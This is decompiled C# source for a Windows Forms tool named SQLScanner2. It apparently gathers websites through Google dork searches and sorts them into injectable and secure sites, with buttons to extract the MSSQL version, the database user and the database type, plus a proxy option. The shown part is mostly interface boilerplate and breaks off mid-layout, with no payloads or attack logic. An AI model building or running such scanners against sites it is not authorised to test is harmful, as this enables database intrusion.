using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLScanner2.My.Resources;

namespace SQLScanner2;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("chk_site")]
	private CheckBox _chk_site;

	[AccessedThroughProperty("Logo")]
	private Label _Logo;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("btn_sites")]
	private Button _btn_sites;

	[AccessedThroughProperty("btn_google")]
	private Button _btn_google;

	[AccessedThroughProperty("txt_site")]
	private TextBox _txt_site;

	[AccessedThroughProperty("txt_dork")]
	private TextBox _txt_dork;

	[AccessedThroughProperty("GroupBox2")]
	private GroupBox _GroupBox2;

	[AccessedThroughProperty("btn_user")]
	private Button _btn_user;

	[AccessedThroughProperty("btn_dbtype")]
	private Button _btn_dbtype;

	[AccessedThroughProperty("txt_prefix")]
	private TextBox _txt_prefix;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("btn_version")]
	private Button _btn_version;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("txt_injections")]
	private RichTextBox _txt_injections;

	[AccessedThroughProperty("txt_secure")]
	private RichTextBox _txt_secure;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("txt_allsites")]
	private RichTextBox _txt_allsites;

	[AccessedThroughProperty("TabPage4")]
	private TabPage _TabPage4;

	[AccessedThroughProperty("txt_status")]
	private RichTextBox _txt_status;

	[AccessedThroughProperty("GroupBox3")]
	private GroupBox _GroupBox3;

	[AccessedThroughProperty("chk_proxy")]
	private CheckBox _chk_proxy;

	[AccessedThroughProperty("txt_port")]
	private TextBox _txt_port;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("txt_server")]
	private TextBox _txt_server;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("txt_totalcount")]
	private Label _txt_totalcount;

	[AccessedThroughProperty("txt_injectionstatus")]
	private Label _txt_injectionstatus;

	[AccessedThroughProperty("Open")]
	private OpenFileDialog _Open;

	[AccessedThroughProperty("TabPage5")]
	private TabPage _TabPage5;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage6")]
	private TabPage _TabPage6;

	[AccessedThroughProperty("TabPage7")]
	private TabPage _TabPage7;

	[AccessedThroughProperty("TabPage8")]
	private TabPage _TabPage8;

	[AccessedThroughProperty("TabControl2")]
	private TabControl _TabControl2;

	[AccessedThroughProperty("TabPage9")]
	private TabPage _TabPage9;

	[AccessedThroughProperty("TabPage10")]
	private TabPage _TabPage10;

	[AccessedThroughProperty("TabPage11")]
	private TabPage _TabPage11;

	[AccessedThroughProperty("TabPage12")]
	private TabPage _TabPage12;

	[AccessedThroughProperty("txt_version")]
	private RichTextBox _txt_version;

	[AccessedThroughProperty("txt_user")]
	private RichTextBox _txt_user;

	[AccessedThroughProperty("txt_mysql")]
	private RichTextBox _txt_mysql;

	[AccessedThroughProperty("txt_mssql")]
	private RichTextBox _txt_mssql;

	[AccessedThroughProperty("txt_access")]
	private RichTextBox _txt_access;

	[AccessedThroughProperty("txt_unknown")]
	private RichTextBox _txt_unknown;

	private string dir;

	public Array keywords;

	private ArrayList psites;

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual CheckBox chk_site
	{
		[DebuggerNonUserCode]
		get
		{
			return _chk_site;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_chk_site = value;
		}
	}

	internal virtual Label Logo
	{
		[DebuggerNonUserCode]
		get
		{
			return _Logo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Logo = value;
		}
	}

	private virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual Button btn_sites
	{
		[DebuggerNonUserCode]
		get
		{
			return _btn_sites;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_btn_sites != null)
			{
				((Control)_btn_sites).remove_Click((EventHandler)btn_sites_Click);
			}
			_btn_sites = value;
			if (_btn_sites != null)
			{
				((Control)_btn_sites).add_Click((EventHandler)btn_sites_Click);
			}
		}
	}

	internal virtual Button btn_google
	{
		[DebuggerNonUserCode]
		get
		{
			return _btn_google;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_btn_google != null)
			{
				((Control)_btn_google).remove_Click((EventHandler)btn_google_Click);
			}
			_btn_google = value;
			if (_btn_google != null)
			{
				((Control)_btn_google).add_Click((EventHandler)btn_google_Click);
			}
		}
	}

	internal virtual TextBox txt_site
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_site;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_site = value;
		}
	}

	internal virtual TextBox txt_dork
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_dork;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_dork = value;
		}
	}

	internal virtual GroupBox GroupBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox2 = value;
		}
	}

	internal virtual Button btn_user
	{
		[DebuggerNonUserCode]
		get
		{
			return _btn_user;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_btn_user != null)
			{
				((Control)_btn_user).remove_Click((EventHandler)btn_user_Click);
			}
			_btn_user = value;
			if (_btn_user != null)
			{
				((Control)_btn_user).add_Click((EventHandler)btn_user_Click);
			}
		}
	}

	internal virtual Button btn_dbtype
	{
		[DebuggerNonUserCode]
		get
		{
			return _btn_dbtype;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_btn_dbtype != null)
			{
				((Control)_btn_dbtype).remove_Click((EventHandler)btn_dbtype_Click);
			}
			_btn_dbtype = value;
			if (_btn_dbtype != null)
			{
				((Control)_btn_dbtype).add_Click((EventHandler)btn_dbtype_Click);
			}
		}
	}

	internal virtual TextBox txt_prefix
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_prefix;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_prefix = value;
		}
	}

	private virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Button btn_version
	{
		[DebuggerNonUserCode]
		get
		{
			return _btn_version;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_btn_version != null)
			{
				((Control)_btn_version).remove_Click((EventHandler)btn_version_Click);
			}
			_btn_version = value;
			if (_btn_version != null)
			{
				((Control)_btn_version).add_Click((EventHandler)btn_version_Click);
			}
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual RichTextBox txt_injections
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_injections;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_injections = value;
		}
	}

	internal virtual RichTextBox txt_secure
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_secure;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_secure = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual RichTextBox txt_allsites
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_allsites;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_allsites = value;
		}
	}

	internal virtual TabPage TabPage4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage4 = value;
		}
	}

	internal virtual RichTextBox txt_status
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_status;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_status = value;
		}
	}

	internal virtual GroupBox GroupBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox3 = value;
		}
	}

	internal virtual CheckBox chk_proxy
	{
		[DebuggerNonUserCode]
		get
		{
			return _chk_proxy;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_chk_proxy = value;
		}
	}

	internal virtual TextBox txt_port
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_port;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_port = value;
		}
	}

	private virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual TextBox txt_server
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_server;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_server = value;
		}
	}

	private virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label txt_totalcount
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_totalcount;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_totalcount = value;
		}
	}

	internal virtual Label txt_injectionstatus
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_injectionstatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_injectionstatus = value;
		}
	}

	internal virtual OpenFileDialog Open
	{
		[DebuggerNonUserCode]
		get
		{
			return _Open;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Open = value;
		}
	}

	internal virtual TabPage TabPage5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage5 = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage6 = value;
		}
	}

	internal virtual TabPage TabPage7
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage7 = value;
		}
	}

	internal virtual TabPage TabPage8
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage8 = value;
		}
	}

	internal virtual TabControl TabControl2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl2 = value;
		}
	}

	internal virtual TabPage TabPage9
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage9 = value;
		}
	}

	internal virtual TabPage TabPage10
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage10 = value;
		}
	}

	internal virtual TabPage TabPage11
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage11 = value;
		}
	}

	internal virtual TabPage TabPage12
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage12 = value;
		}
	}

	internal virtual RichTextBox txt_version
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_version;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_version = value;
		}
	}

	internal virtual RichTextBox txt_user
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_user;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_user = value;
		}
	}

	internal virtual RichTextBox txt_mysql
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_mysql;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_mysql = value;
		}
	}

	internal virtual RichTextBox txt_mssql
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_mssql;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_mssql = value;
		}
	}

	internal virtual RichTextBox txt_access
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_access;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_access = value;
		}
	}

	internal virtual RichTextBox txt_unknown
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_unknown;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_unknown = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		dir = FileSystem.CurDir();
		keywords = File.ReadAllLines("inc/keywords.txt");
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_03fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_050c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0839: Unknown result type (might be due to invalid IL or missing references)
		//IL_094a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c0: Expected O, but got Unknown
		//IL_11b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_11bb: Expected O, but got Unknown
		//IL_1263: Unknown result type (might be due to invalid IL or missing references)
		//IL_126d: Expected O, but got Unknown
		//IL_1496: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a0: Expected O, but got Unknown
		//IL_1a37: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a41: Expected O, but got Unknown
		//IL_1b2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b34: Expected O, but got Unknown
		//IL_1bd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bda: Expected O, but got Unknown
		//IL_1e29: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e33: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TabPage1 = new TabPage();
		txt_injections = new RichTextBox();
		TabPage2 = new TabPage();
		txt_secure = new RichTextBox();
		TabPage3 = new TabPage();
		txt_allsites = new RichTextBox();
		TabPage8 = new TabPage();
		TabControl2 = new TabControl();
		TabPage9 = new TabPage();
		txt_version = new RichTextBox();
		TabPage10 = new TabPage();
		txt_user = new RichTextBox();
		TabPage5 = new TabPage();
		TabControl1 = new TabControl();
		TabPage6 = new TabPage();
		txt_mysql = new RichTextBox();
		TabPage7 = new TabPage();
		txt_mssql = new RichTextBox();
		TabPage11 = new TabPage();
		txt_access = new RichTextBox();
		TabPage12 = new TabPage();
		txt_unknown = new RichTextBox();
		TabPage4 = new TabPage();
		txt_status = new RichTextBox();
		Label1 = new Label();
		Label2 = new Label();
		chk_site = new CheckBox();
		Logo = new Label();
		GroupBox1 = new GroupBox();
		txt_prefix = new TextBox();
		Label3 = new Label();
		txt_site = new TextBox();
		txt_dork = new TextBox();
		btn_sites = new Button();
		btn_google = new Button();
		GroupBox2 = new GroupBox();
		btn_version = new Button();
		btn_user = new Button();
		btn_dbtype = new Button();
		GroupBox3 = new GroupBox();
		txt_port = new TextBox();
		Label5 = new Label();
		txt_server = new TextBox();
		Label4 = new Label();
		chk_proxy = new CheckBox();
		txt_totalcount = new Label();
		txt_injectionstatus = new Label();
		Open = new OpenFileDialog();
		TabControl val = new TabControl();
		((Control)val).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)TabPage2).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)TabPage8).SuspendLayout();
		((Control)TabControl2).SuspendLayout();
		((Control)TabPage9).SuspendLayout();
		((Control)TabPage10).SuspendLayout();
		((Control)TabPage5).SuspendLayout();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage6).SuspendLayout();
		((Control)TabPage7).SuspendLayout();
		((Control)TabPage11).SuspendLayout();
		((Control)TabPage12).SuspendLayout();
		((Control)TabPage4).SuspendLayout();
		((Control)GroupBox1).SuspendLayout();
		((Control)GroupBox2).SuspendLayout();
		((Control)GroupBox3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)val).get_Controls().Add((Control)(object)TabPage1);
		((Control)val).get_Controls().Add((Control)(object)TabPage2);
		((Control)val).get_Controls().Add((Control)(object)TabPage3);
		((Control)val).get_Controls().Add((Control)(object)TabPage8);
		((Control)val).get_Controls().Add((Control)(object)TabPage5);
		((Control)val).get_Controls().Add((Control)(object)TabPage4);
		((Control)val).set_Cursor(Cursors.get_Default());
		val.set_HotTrack(true);
		Point location = new Point(6, 238);
		((Control)val).set_Location(location);
		((Control)val).set_Name("Tabs");
		val.set_SelectedIndex(0);
		Size size = new Size(704, 195);
		((Control)val).set_Size(size);
		val.set_SizeMode((TabSizeMode)2);
		((Control)val).set_TabIndex(6);
		((Control)TabPage1).get_Controls().Add((Control)(object)txt_injections);
		TabPage tabPage = TabPage1;
		location = new Point(4, 22);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(696, 169);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("Injections Found");
		TabPage1.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_injections).set_BackColor(Color.Gray);
		((Control)txt_injections).set_Dock((DockStyle)5);
		RichTextBox obj = txt_injections;
		location = new Point(3, 3);
		((Control)obj).set_Location(location);
		((Control)txt_injections).set_Name("txt_injections");
		RichTextBox obj2 = txt_injections;
		size = new Size(690, 163);
		((Control)obj2).set_Size(size);
		((Control)txt_injections).set_TabIndex(11);
		txt_injections.set_Text("");
		((Control)TabPage2).get_Controls().Add((Control)(object)txt_secure);
		TabPage tabPage4 = TabPage2;
		location = new Point(4, 22);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(696, 169);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("Secure Sites");
		TabPage2.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_secure).set_BackColor(Color.Gray);
		((Control)txt_secure).set_Dock((DockStyle)5);
		RichTextBox obj3 = txt_secure;
		location = new Point(3, 3);
		((Control)obj3).set_Location(location);
		((Control)txt_secure).set_Name("txt_secure");
		RichTextBox obj4 = txt_secure;
		size = new Size(690, 163);
		((Control)obj4).set_Size(size);
		((Control)txt_secure).set_TabIndex(12);
		txt_secure.set_Text("");
		((Control)TabPage3).get_Controls().Add((Control)(object)txt_allsites);
		TabPage tabPage7 = TabPage3;
		location = new Point(4, 22);
		tabPage7.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage8 = TabPage3;
		size = new Size(696, 169);
		((Control)tabPage8).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("All Sites");
		TabPage3.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_allsites).set_BackColor(Color.Gray);
		((Control)txt_allsites).set_Dock((DockStyle)5);
		RichTextBox obj5 = txt_allsites;
		location = new Point(0, 0);
		((Control)obj5).set_Location(location);
		((Control)txt_allsites).set_Name("txt_allsites");
		RichTextBox obj6 = txt_allsites;
		size = new Size(696, 169);
		((Control)obj6).set_Size(size);
		((Control)txt_allsites).set_TabIndex(13);
		txt_allsites.set_Text("");
		((Control)TabPage8).get_Controls().Add((Control)(object)TabControl2);
		TabPage tabPage9 = TabPage8;
		location = new Point(4, 22);
		tabPage9.set_Location(location);
		((Control)TabPage8).set_Name("TabPage8");
		TabPage tabPage10 = TabPage8;
		size = new Size(696, 169);
		((Control)tabPage10).set_Size(size);
		TabPage8.set_TabIndex(5);
		TabPage8.set_Text("Injection Info");
		TabPage8.set_UseVisualStyleBackColor(true);
		TabControl2.set_Appearance((TabAppearance)2);
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage9);
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage10);
		((Control)TabControl2).set_Dock((DockStyle)5);
		TabControl tabControl = TabControl2;
		location = new Point(0, 0);
		((Control)tabControl).set_Location(location);
		((Control)TabControl2).set_Name("TabControl2");
		TabControl2.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl2;
		size = new Size(696, 169);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl2).set_TabIndex(14);
		((Control)TabPage9).get_Controls().Add((Control)(object)txt_version);
		TabPage tabPage11 = TabPage9;
		location = new Point(4, 25);
		tabPage11.set_Location(location);
		((Control)TabPage9).set_Name("TabPage9");
		TabPage tabPage12 = TabPage9;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage12).set_Padding(padding);
		TabPage tabPage13 = TabPage9;
		size = new Size(688, 140);
		((Control)tabPage13).set_Size(size);
		TabPage9.set_TabIndex(0);
		TabPage9.set_Text("MSSQL Version");
		TabPage9.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_version).set_BackColor(Color.Gray);
